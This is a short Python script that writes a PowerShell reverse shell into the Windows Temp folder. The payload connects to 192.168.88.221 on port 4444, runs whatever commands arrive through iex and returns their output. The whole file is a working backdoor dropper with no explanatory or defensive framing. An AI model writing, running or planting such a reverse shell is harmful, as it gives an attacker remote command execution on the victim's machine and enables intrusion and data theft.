from username import get_username
import os
def create_reverseshell_PS1(file_path):
    

    data_to_write = """$client = New-Object System.Net.Sockets.TcpClient('192.168.88.221',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()"""
    try:
        with open(file_path, "w") as file:
            file.write(data_to_write)
        print(f"File created successfully at: {file_path}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    username = get_username()
    #location file .bat
    reverseshell_path = f"C:\\Windows\\Temp\\shell.ps1"     
    create_reverseshell_PS1(reverseshell_path)
    